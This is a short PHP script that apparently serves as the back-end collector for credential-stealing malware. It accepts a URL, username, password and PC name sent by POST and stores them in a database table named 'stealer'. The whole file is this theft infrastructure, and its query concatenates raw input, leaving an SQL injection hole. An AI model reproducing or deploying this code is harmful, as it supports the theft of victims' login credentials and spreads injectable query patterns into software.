<?php

	include 'conn.php';
	
	$url = $_POST['url'];
	$user = $_POST['user'];
	$password = $_POST['password'];
	$pcname= $_POST['pcname'];

 	$connect->query("INSERT INTO stealer (url,user,password,pcname) VALUES ('".$url."','".$user."','".$password."','".$pcname."')")
	


?>